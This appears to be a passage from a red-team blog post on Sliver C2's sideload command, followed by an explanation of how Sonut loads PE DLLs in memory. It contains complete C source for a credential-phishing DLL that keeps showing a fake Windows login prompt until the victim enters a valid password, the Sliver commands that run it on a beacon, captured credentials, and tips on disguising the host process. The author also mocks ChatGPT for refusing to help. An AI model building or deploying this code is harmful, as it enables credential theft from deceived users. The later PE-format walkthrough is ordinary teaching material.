+			<span style="color:#f92672">&amp;</span>uiInfo,
+			<span style="color:#ae81ff">0</span>,
+			<span style="color:#f92672">&amp;</span>authPackage,
+			<span style="color:#66d9ef">nullptr</span>,
+			<span style="color:#ae81ff">0</span>,
+			<span style="color:#f92672">&amp;</span>authBuffer,
+			<span style="color:#f92672">&amp;</span>ulAuthBufferSize,
+			<span style="color:#f92672">&amp;</span>fSave,
+			CREDUIWIN_ENUMERATE_CURRENT_USER
+		);
+
+		<span style="color:#66d9ef">if</span> (dwAuthError <span style="color:#f92672">==</span> ERROR_SUCCESS) {
+			WCHAR pszUserName[CREDUI_MAX_USERNAME_LENGTH <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(WCHAR)];
+			DWORD dwMaxUserName <span style="color:#f92672">=</span> CREDUI_MAX_USERNAME_LENGTH <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+			WCHAR pszDomainName[CREDUI_MAX_DOMAIN_TARGET_LENGTH <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(WCHAR)];
+			DWORD dwMaxDomainName <span style="color:#f92672">=</span> CREDUI_MAX_DOMAIN_TARGET_LENGTH <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+			WCHAR pszPassword[CREDUI_MAX_PASSWORD_LENGTH <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(WCHAR)];
+			DWORD dwMaxPassword <span style="color:#f92672">=</span> CREDUI_MAX_PASSWORD_LENGTH <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+			CredUnPackAuthenticationBufferW(
+				CRED_PACK_PROTECTED_CREDENTIALS,
+				authBuffer,
+				ulAuthBufferSize,
+				pszUserName,
+				<span style="color:#f92672">&amp;</span>dwMaxUserName,
+				pszDomainName,
+				<span style="color:#f92672">&amp;</span>dwMaxDomainName,
+				pszPassword,
+				<span style="color:#f92672">&amp;</span>dwMaxPassword
+			);
+
+			WCHAR parsedUserName[CREDUI_MAX_USERNAME_LENGTH <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(WCHAR)];
+			WCHAR parsedDomain[CREDUI_MAX_DOMAIN_TARGET_LENGTH <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(WCHAR)];
+			CredUIParseUserNameW(
+				pszUserName,
+				parsedUserName,
+				CREDUI_MAX_USERNAME_LENGTH <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>,
+				parsedDomain,
+				CREDUI_MAX_DOMAIN_TARGET_LENGTH <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+			);
+
+			HANDLE handle <span style="color:#f92672">=</span> <span style="color:#66d9ef">nullptr</span>;
+			loginStatus <span style="color:#f92672">=</span> LogonUserW(
+				parsedUserName,
+				parsedDomain,
+				pszPassword,
+				LOGON32_LOGON_NETWORK,
+				LOGON32_PROVIDER_DEFAULT,
+				<span style="color:#f92672">&amp;</span>handle
+			);
+
+			<span style="color:#66d9ef">if</span> (loginStatus <span style="color:#f92672">==</span> TRUE) {
+				CloseHandle(handle);
+				fwprintf(stdout, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Correct credentials: %s:%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pszUserName, pszPassword);
+				<span style="color:#66d9ef">break</span>;
+			}
+			<span style="color:#66d9ef">else</span> {
+				fwprintf(stdout, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Wrong credentials: %s:%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pszUserName, pszPassword);
+			}
+		}
+	}
+}
+
+<span style="color:#75715e">// call from Sliver: &#39;sideload --entry-point RunMyCode PasswordPrompt.dll &#34;3&#34;&#39;
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span>
+<span style="color:#66d9ef">__declspec</span>(dllexport)
+VOID RunMyCode(LPSTR arg)
+{
+	errno <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+	DWORD maxTries <span style="color:#f92672">=</span> strtol(arg, NULL, <span style="color:#ae81ff">10</span>);
+	<span style="color:#66d9ef">if</span> (errno <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> maxTries <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+		maxTries <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>; <span style="color:#75715e">// default for no or erroneous argument
+</span><span style="color:#75715e"></span>	}
+	fwprintf(stdout, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Asking for credentials at most %d times</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, maxTries);
+
+	askForCreds(maxTries);
+
+	fflush(stdout);
+}
+
+<span style="color:#75715e">// call locally: &#39;rundll32.exe PasswordPrompt.dll RunWithRunDLL32 3&#39;
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span>
+<span style="color:#66d9ef">__declspec</span>(dllexport)
+VOID RunWithRunDLL32(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, <span style="color:#66d9ef">int</span> nCmdShow)
+{
+	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>AttachConsole(ATTACH_PARENT_PROCESS))
+		<span style="color:#66d9ef">return</span>;
+
+	<span style="color:#66d9ef">if</span> (_fileno(stdout) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
+		freopen(<span style="color:#e6db74">&#34;CONOUT$&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>, stdout);
+
+	RunMyCode(lpszCmdLine);
+}
+</code></pre></div><p>The main part of the code is in the function <code>askForCreds</code>, which uses the following Windows APIs to do its work:</p>
+<ul>
+<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-creduipromptforwindowscredentialsw">CredUIPromptForWindowsCredentialsW</a>:
+Displays the dialog box for password entry.
+Note that you can change the text it displays.</li>
+<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credunpackauthenticationbufferw">CredUnPackAuthenticationBufferW</a>:
+is used to parse the data entered by the user.</li>
+<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-creduiparseusernamew">CredUIParseUserNameW</a>:
+splits the username entered in the dialog box into domain and user account.</li>
+<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonuserw">LogonUserW</a>:
+attempts a login to the local machine with the credentials.</li>
+</ul>
+<p>There is a parameter <code>maxTries</code> which should be the number of times you want the dialog box to re-appear when wrong credentials are entered.
+Pick a sufficiently high number and a user may eventually enter correct credentials just to make that window go away.
+But don&rsquo;t pick a value so high that they call IT for help.
+The program stops once authentication is successful or the maximum number of tries is reached.
+Credentials are just printed to <code>stdout</code>.</p>
+<p>There are a few more functions in the code. Their purpose is as follows:</p>
+<ul>
+<li><code>DllMain</code>: the entrypoint of a DLL. Does not do anything in this case.</li>
+<li><code>RunMyCode</code>: a function parsing a string argument as a number. <code>askForCreds</code> is called with that number as <code>maxTries</code>.
+<code>RunMyCode</code> is the function we will later call from Sliver, which can only pass string arguments.<br>
+We also export it so that it can be called by its name.</li>
+<li><code>RunWithRunDLL32</code>: just for development, this is a function allowing us to use <a href="https://de.wikipedia.org/wiki/Rundll32.exe">rundll32.exe</a>
+to run the DLL. This is not required to run via <code>sideload</code> and could be deleted.</li>
+</ul>
+<p>Try to build this thing and most likely the compiler won&rsquo;t let you.
+This pettifogging smart-arse complains about the function <code>freopen</code>, which it thinks is unsafe.
+Of course I gave my best to fix this but ChatGPT refused to obey each time I asked it to rewrite the function,
+claiming that it cannot provide code that can be used for malicious activity,
+although I have repeatedly assured that I have only the best of intentions&hellip;
+This insubordinate AI left me with no other choice than to add <code>_CRT_SECURE_NO_WARNINGS</code> to the preprocessor definitions.
+After all, I fully trust that the folks over at
+<a href="https://dev-community.de/resources/c-winapi-rundll32-exe-und-ausf%C3%BChrung-von-eigenen-libraryfunktionen.28/">dev-community.de</a>
+know what they are doing anyway (which is where I blindly copy-pasted that snippet from).
+Here is how to make it work:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/setting_preprocessor_definition.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Setting a preprocessor definition to ignore build warnings</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>You should now have a file <code>PasswordPrompt.dll</code>.
+Move it over to the Sliver C2 server and connect to the Sliver console.
+Also make sure you have a beacon on the target machine.</p>
+<p>To run the DLL via sideload, use your beacon and create a task: <code>sideload --entry-point RunMyCode /payloads/PasswordPrompt.dll 2</code>.
+In my case, <code>/payloads/PasswordPrompt.dll</code> was where I stored the compiled DLL on the Sliver server.
+The argument <code>--entry-point</code> must be an exported function in the DLL (<code>RunMyCode</code>)
+and everything in the end are string arguments for that function (<code>2</code> in this case).
+For the victim it will look like this when the task executes:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/sideloading-password-prompt.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Target Windows machine asks for credentials</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Assuming that the victim decides to interact with the prompt, the operator will see the output shown below.
+In this example, the victim first typed the wrong password, then the correct one:</p>
+<pre tabindex="0"><code>sliver (FAT_SOMEWHERE) &gt; sideload --entry-point RunMyCode /payloads/PasswordPrompt.dll 2
+
+[*] Tasked beacon FAT_SOMEWHERE (7c7954d2)
+
+[+] FAT_SOMEWHERE completed task 7c7954d2
+
+[*] Output:
+Asking for credentials at most 2 times
+Wrong credentials: DESKTOP-HJGD7UQ\tester:thisiswrong
+Correct credentials: DESKTOP-HJGD7UQ\tester:myS3curePass
+
+</code></pre><p>This is it for the demonstration of command usage.
+Here comes the help text with an overview of all the flags we could have passed but didn&rsquo;t:</p>
+<pre tabindex="0"><code>sliver (FAT_SOMEWHERE) &gt; sideload --help
+
+Command: sideload &lt;options&gt; &lt;filepath to DLL&gt;
+About: Load and execute a shared library in memory in a remote process.
+Example usage:
+
+Sideload a MacOS shared library into a new process using DYLD_INSERT_LIBRARIES:
+        sideload -p /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment -a 'Hello World' /tmp/mylib.dylib
+Sideload a Linux shared library into a new bash process using LD_PRELOAD:
+        sideload -p /bin/bash /tmp/mylib.so
+Sideload a Windows DLL as shellcode in a new process using Donut, specifying the entrypoint and its arguments:
+        sideload -e MyEntryPoint /tmp/mylib.dll &quot;argument to the function MyEntryPoint&quot;
+
+Remarks:
+Linux and MacOS shared library must call exit() once done with their jobs, as the Sliver implant will wait until the hosting process
+terminates before responding. This will also prevent the hosting process to run indefinitely.
+This is not required on Windows since the payload is injected as a new remote thread, and we wait for the thread completion before
+killing the hosting process.
+
+Parameters to the Linux and MacOS shared module are passed using the LD_PARAMS environment variable.
+
+
+Usage:
+======
+  sideload [flags] filepath [args...]
+
+Args:
+=====
+  filepath  string         path the shared library file
+  args      string list    arguments for the binary (default: [])
+
+Flags:
+======
+  -e, --entry-point       string    Entrypoint for the DLL (Windows only)
+  -h, --help                        display help
+  -k, --keep-alive                  don't terminate host process once the execution completes
+  -X, --loot                        save output as loot
+  -n, --name              string    name to assign loot (optional)
+  -P, --ppid              uint      parent process id (optional) (default: 0)
+  -p, --process           string    Path to process to host the shellcode (default: c:\windows\system32\notepad.exe)
+  -A, --process-arguments string    arguments to pass to the hosting process
+  -s, --save                        save output to file
+  -t, --timeout           int       command timeout in seconds (default: 60)
+  -w, --unicode                     Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)
+</code></pre><p>To structure the flags, think of them the following way.
+First, you decide what you want to execute:</p>
+<ul>
+<li>Function: the name of your exported function goes into <code>--entry-point</code>.</li>
+<li>Arguments: all additional arguments you want to pass to the DLL function (<code>args</code>) go to the very end.
+By default they are passed as ANSI strings, but you can use <code>--unicode</code> to use wide Unicode strings
+(click <a href="https://learn.microsoft.com/en-us/windows/win32/learnwin32/working-with-strings#unicode-and-ansi-functions">here</a> to understand the difference).
+Check your function signature to see what to use.</li>
+</ul>
+<p>You also have some control about how to execute the DLL.
+In all cases, what the implant will do is launch a sacrificial process and inject the DLL into it.
+You decide:</p>
+<ul>
+<li>What process the Implant launches: specify the executable with <code>--process</code> and <code>--process-arguments</code> are supported too.</li>
+<li>Whether or not to kill the process when your payload stops: pass <code>--keep-alive</code> if you don&rsquo;t want that.</li>
+<li>Whether to spoof the parent process ID of the new process: pass <code>--ppid</code> with the ID of an existing process.</li>
+</ul>
+<p>Finally decide what to do with the output, which will just be printed out on the Sliver console by default:</p>
+<ul>
+<li>Save as loot: pass <code>--loot</code> to enable and define a <code>--name</code> for the output.</li>
+<li>Save to disk: enable with <code>--save</code></li>
+<li>Just watch: don&rsquo;t set any of these flags and you just get the output printed out.</li>
+</ul>
+<h3 id="customization">Customization</h3>
+<p>To see what the flags could be good for, consider the following example.
+I&rsquo;ll use the <code>--process</code> argument to specify a better process to launch.
+By default Notepad is launched, but since my implant is running in Edge I would rather use some binary that Edge
+normally creates processes from.
+To find one, run <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon">process monitor</a> (Procmon, Sysinternals)
+with a filter for the &ldquo;Process Create&rdquo; operation and use Edge until something appears.
+After a while, you will notice a binary called <code>identity_helper.exe</code>
+(<a href="https://learn.microsoft.com/en-us/answers/questions/163010/what-is-identity-helper-exe">apparently related</a> to the progressive web app integration of Edge):</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/procmon-identiy-common-subprocesses.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Identifying typical subprocesses of MS Edge with Procmon</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Now pass it as the process for sideload in the following command:
+<code>sideload --entry-point RunMyCode --process &quot;C:\Program Files (x86)\Microsoft\Edge\Application\109.0.1518.61\identity_helper.exe&quot; /mnt/smb/PasswordPrompt.dll 3</code>
+(note the version in the path, which you should always enumerate on the target first).
+The user is prompted for the password again:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/process_hacker_subprocess_view.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Password prompt shows up again but without notepad icon or suspicious subprocess relationship</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Looks much better now. Not only is the icon in the task bar not that of Notepad anymore (why on earth would Notepad ask for your password?).
+If you look at the process hierarchy, you now see the identity helper as a subprocess of Edge.
+Anybody who ask Google if that is a reason to worry will get plenty of assurance that is its not:</p>
+<h2 id="implementation-details">Implementation details</h2>
+<h3 id="sliver-source-code">Sliver source code</h3>
+<p>The sideload command should now be clear from a user perspective.
+Let&rsquo;s have a look at the source now to see how its implemented.
+All paths to source code files I&rsquo;ll mention will be relative to the root of the
+<a href="https://github.com/BishopFox/sliver/tree/v1.5.30">Sliver GitHub repo</a>, version v1.5.30.</p>
+<p>Above, we dispatched the command from the Sliver client.
+The code for that lives in <code>client/</code> and the
+<a href="https://github.com/BishopFox/sliver/blob/v1.5.30/client/command/exec/sideload.go">SideloadCmd</a>
+command specifically is defined in <code>client/command/exec/sideload.go</code>.
+Not much is going on in there.
+The client parses arguments, reads the DLL, sends everything to the Sliver server via RPC
+and later displays results.</p>
+<p>The server source is located in <code>server/</code>. Our sideload RPC call should be handled by
+<a href="https://github.com/BishopFox/sliver/blob/v1.5.30/server/rpc/rpc-tasks.go#L193">Sideload</a>
+within <code>server/rpc/rpc-tasks.go</code>.
+This handler uses <a href="https://github.com/BishopFox/sliver/blob/v1.5.30/server/generate/donut.go#L23">DonutShellcodeFromPE</a>
+to make shellcode out of the DLL.
+Effectively this delegates to <a href="https://github.com/Binject/go-donut">go-donut</a>,
+a Go-based generator for <a href="https://github.com/TheWover/donut">Donut</a> shellcode.
+That shellcode is sent with a <a href="https://github.com/BishopFox/sliver/blob/v1.5.30/protobuf/sliverpb/sliver.pb.go#L4021">SideloadReq</a>
+to the active beacon or session (so this may take time for slow C2 protocols and big DLLs).</p>
+<p>Now we have to look at the implant whose code is in <code>implant/</code>.
+There you can find a <a href="https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/handlers/rpc-handlers.go#L118">sideloadHandler</a>
+which seems to be registered <a href="https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/handlers/handlers_windows.go#L75">here</a>.
+It delegates to the Windows implementation of sideload defined on the task runner.
+Find it <a href="https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/taskrunner/task_windows.go#L422">here</a>.
+It just delegates again to the <a href="https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/taskrunner/task_windows.go#L346">SpawnDLL</a>
+function which finally does the heavy lifting.
+Effectively this creates a new process and injects the shellcode in the same way as the <code>execute-assembly</code> does,
+albeit with a slightly different implementation. I refer to <a href="../../post/learning_sliver_c2_09_execute_assembly#sliver-source-code">the previous post</a>
+for a more detailed discussion. The short version is:</p>
+<ul>
+<li>start a new suspended process with Go&rsquo;s <code>os/exec</code>, optionally with PPID spoofing</li>
+<li>Inject shellcode and execute with the classic technique (<code>VirtualAllocEx -&gt; WriteProcessMemory -&gt; VirtualProtectEx -&gt; CreateRemoteThread</code>)</li>
+</ul>
+<p>As far as Sliver itself is concerned this is more or less all that happens.
+The only difference to <code>execute-assembly</code> is that <a href="https://github.com/TheWover/donut">Donut</a> is used in a different way
+and that in-process execution is not supported.
+Again, I&rsquo;ll therefore go a bit deeper into Donut itself to see what it does with PE files.</p>
+<h3 id="inside-donut">Inside Donut</h3>
+<p>For this section I&rsquo;ll forget about Sliver entirely and showcase Donut standalone.
+With the Donut dev setup its easier to see what&rsquo;s going on than with pure shellcode.</p>
+<p>If you want to follow along you&rsquo;ll need the <a href="https://github.com/TheWover/donut">Donut source</a> checked out on a Windows machine.
+Relevant parts of the source here are in the <code>loader/</code> directory of the Donut repo.
+The main code of the loader is in <code>loader/loader.c</code> while the parts specific to PE DLL
+loading are inside <code>loader/inmem_pe.c</code>.</p>
+<p>To build, open the &ldquo;x64 Native Tools Command Prompt for VS 2022&rdquo; and use it to build Donut with <code>nmake debug -f Makefile.msvc</code>.
+You get two files <code>donut.exe</code> and <code>loader.exe</code>.
+Use <code>donut.exe</code> with your favorite PE DLL file to get an &ldquo;instance&rdquo;,
+which can the be loaded with the <code>loader.exe</code>.
+Donut is nice and prints lots of debug messages to the console when running.
+You can also add your own debug prints or pause execution to debug and inspect memory.</p>
+<p>I&rsquo;ll keep using the sample DLL <code>PasswordPrompt.dll</code> here.
+Create the Donut instance with <code>.\donut.exe -p 1 -m RunMyCode C:\share\PasswordPrompt.dll</code>
+(change the path to the DLL as needed), which creates a file called <code>instance</code>.
+Load it with the loader: <code>./loader.exe ./instance</code>, which should produce the following result if everything worked well:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/donut_run.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Running the Donut instance of PasswordPrompt.dll with the loader</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>We leave out all generic stuff about the Donut loader (briefly touched upon in
+<a href="../../post/learning_sliver_c2_09_execute_assembly#inside-donut">post 9</a>)
+and focus here on the part specific to PE DLL loading.
+Pay attention to the beginning of each line in Donut console output.
+It shows the source code file the message came from.
+We focus here on stuff from the <code>loader/inmem_pe.c</code> source file.
+It does several things, which I would roughly summarize as follows:</p>
+<ul>
+<li>Allocate memory and copy DLL into it.</li>
+<li>Apply relocations. Soon more on what that means.</li>
+<li>Process the import table. The DLL we load depends on other DLLs so we have to load them first.</li>
+<li>Execute DLL entrypoint.</li>
+<li>Call the function we gave it.</li>
+</ul>
+<p>In fact it supports even more, but those parts are irrelevant for the current example DLL so I won&rsquo;t show any of that:</p>
+<ul>
+<li>Delayed imports: a DLL dependency can be loaded on first use, not on startup. Donut can import these.</li>
+<li>TLS callbacks: a DLL can define functions that should be called on process creation. Donut can execute them if they exist, but they run only once on startup.</li>
+</ul>
+<p>I&rsquo;ll now go through each of the steps seen above in the debug output.
+For each, we go into the implementation details.</p>
+<h4 id="writing-the-dll-to-memory">Writing the DLL to memory</h4>
+<p>This is where DLL loading begins.
+We start out at in function <a href="https://github.com/TheWover/donut/blob/0c1d3d09e73a25c65ca7381385a9570c4994239c/loader/inmem_pe.c#L56">RunPE</a>
+which gets the Donut instance and module as arguments.
+This is just all the config and data it needs.
+Most importantly we get the base address to our DLL with <code>mod-&gt;data</code> (see <a href="https://github.com/TheWover/donut/blob/0c1d3d09e73a25c65ca7381385a9570c4994239c/loader/inmem_pe.c#L87">line 87</a>).</p>
+<p>The main steps now taken by the loader are:</p>
+<ul>
+<li>allocate some RWX memory with <code>VirtualAlloc</code>:
+<a href="https://github.com/TheWover/donut/blob/0c1d3d09e73a25c65ca7381385a9570c4994239c/loader/inmem_pe.c#L105">line 105</a>
+(not <code>VirtualAllocEx</code>, this is not process injection).</li>
+<li>copy the PE headers
+(<a href="https://github.com/TheWover/donut/blob/0c1d3d09e73a25c65ca7381385a9570c4994239c/loader/inmem_pe.c#L113">line 113</a>)
+and the PE sections (with the loop in
+<a href="https://github.com/TheWover/donut/blob/0c1d3d09e73a25c65ca7381385a9570c4994239c/loader/inmem_pe.c#L118">line 118</a>)
+into the newly allocated memory.</li>
+</ul>
+<p>You may wonder how Donut finds out all the details like what size the memory should be or where the headers and sections are.
+To understand this you have to understand what a PE file looks like.
+Donut pretty much imitates what Windows does when loading PE files but without
+the constraint that the file has to be on disk.
+In the following, also compare <a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format">the Microsoft docs on the PE format</a>.</p>
+<p>First see <a href="https://github.com/TheWover/donut/blob/0c1d3d09e73a25c65ca7381385a9570c4994239c/loader/inmem_pe.c#L87">line 87</a>,
+where the loader gets the start address of the memory it wants to copy.
+Immediately after that, it casts it to a <code>PIMAGE_DOS_HEADER</code>.
+A DOS header is just what a PE file starts with.
+Its only purpose is compatibility, which means in this case that a PE file executed on legacy MS DOS can print out that it is not compatible.</p>
+<p>The DOS header has a known structure.
+It starts with the bytes <code>4D5A</code> and at offset <code>0x3C</code> you find the address of the actual PE header.
+This is illustrated in this excerpt of the wonderful <a href="https://upload.wikimedia.org/wikipedia/commons/1/1b/Portable_Executable_32_bit_Structure_in_SVG_fixed.svg">Wikimedia illustration</a>
+of the PE format:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/PE_format_DOS_header.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Structure of the DOS header of a PE file</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>A little knowledge is a dangerous thing so let&rsquo;s confirm all of this stuff by looking at the loader in action.
+Add a few debug print statements and a <code>getchar();</code> (my poor man&rsquo;s breakpoint) to the Donut loader.
+I&rsquo;ve put this after <a href="https://github.com/TheWover/donut/blob/0c1d3d09e73a25c65ca7381385a9570c4994239c/loader/inmem_pe.c#L89">line 89</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">...
+<span style="color:#75715e">/* 87 */</span> base <span style="color:#f92672">=</span> mod<span style="color:#f92672">-&gt;</span>data;
+<span style="color:#75715e">/* 88 */</span> dos  <span style="color:#f92672">=</span> (PIMAGE_DOS_HEADER)base;
+<span style="color:#75715e">/* 89 */</span> nt   <span style="color:#f92672">=</span> RVA2VA(PIMAGE_NT_HEADERS, base, dos<span style="color:#f92672">-&gt;</span>e_lfanew);
+<span style="color:#75715e">/* -&gt; */</span> 
+<span style="color:#75715e">/* -&gt; */</span> DPRINT(<span style="color:#e6db74">&#34;base = %p&#34;</span>, ((ULONG_PTR)base));
+<span style="color:#75715e">/* -&gt; */</span> DPRINT(<span style="color:#e6db74">&#34;  nt = %p&#34;</span>, (ULONG_PTR)nt);
+<span style="color:#75715e">/* -&gt; */</span> getchar();
+...
+</code></pre></div><p>Now recompile and execute the loader again.
+It will print the new statements and stop execution until you hit enter.
+Use this break to attach <a href="https://x64dbg.com/">x64dbg</a> and inspect the memory at the locations the loader just printed out.
+At the bottom of the x64dbg window you find memory dump windows.
+Select one, press CTRL+g and then enter the address you want to see:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/x64dbg_dos_header.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>DOS header as seen in memory with x64dbg</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>In my case, the base address was <code>0x15B6E580E48</code> and the <code>nt</code> address
+(start of Common Object File Format (COFF) header, the real header of the PE file) was at <code>0x15B6E580F40</code>.
+Your addresses will be different of course.
+You can also just look for the one and only block of RWX memory to find what you are looking for.</p>
+<p>Now first of all look at the start and indeed you should see <code>4D5A</code> (prints &ldquo;MZ&rdquo;).
+You can also spot the familiar string &ldquo;This program cannot be run in DOS mode&rdquo;,
+which is the message you would see when running the PE on DOS.
+Looks a lot like a PE file so far.</p>
+<p>Now look at the second address we printed out (<code>nt</code>).
+It was located at <code>0x15B6E580F40</code> and there we can see
+the bytes <code>50a50000</code> (prints &ldquo;PE\0\0&rdquo;). This is indeed the signature of the COFF header,
+which comes after the DOS header.
+Looks like that is what the Donut loader found by getting an offset with <code>dos-&gt;e_lfanew</code> from the DOS header.</p>
+<p>How did it do that? As mentioned, the location of the start of COFF header is at offset <code>0x3C</code> relative to the DOS header,
+which was <code>0x15b6e580e84</code> in my case. This offset is a 4-byte value
+(see <a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#signature-image-only">docs</a>)
+and you can see the bytes <code>F8000000</code>. Read them from right to left and you get <code>0xF8</code>.
+Add that to the base address <code>0x15B6E580F40</code> and you get the correct COFF header start address <code>0x15b6e580e84</code>.</p>
+<p>In the Donut loader C code all of this looks super simple because the offsets are derived from
+the definition of <code>PIMAGE_DOS_HEADER</code>.
+Therefore it can just do <code>dos-&gt;e_lfanew</code> to get the offset,
+then add <code>base</code> to get the actual address.</p>
+<p>Similarly, the <code>nt</code> address is then interpreted as a <code>PIMAGE_NT_HEADERS</code> structure which is used
+to dig deeper into the data structures.
+The beginning of the COFF header looks like this:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/PE_format_NT_header.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Structure of the COFF header of a PE file</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Accordingly, we can get the <code>nt-&gt;FileHeader.Machine</code> for a quick host compatibility check
+(<a href="https://github.com/TheWover/donut/blob/master/loader/inmem_pe.c#L96">line 96</a>),
+<code>nt-&gt;OptionalHeader.SizeOfImage</code> to find out how much memory we have to allocate
+(<a href="https://github.com/TheWover/donut/blob/master/loader/inmem_pe.c#L106">line 106</a>),
+the size of the headers <code>nt-&gt;OptionalHeader.SizeOfHeaders</code> so that we can copy them into the memory block
+(<a href="https://github.com/TheWover/donut/blob/master/loader/inmem_pe.c#L113">line 113</a>)
+and also the <code>nt-&gt;FileHeader.NumberOfSections</code>
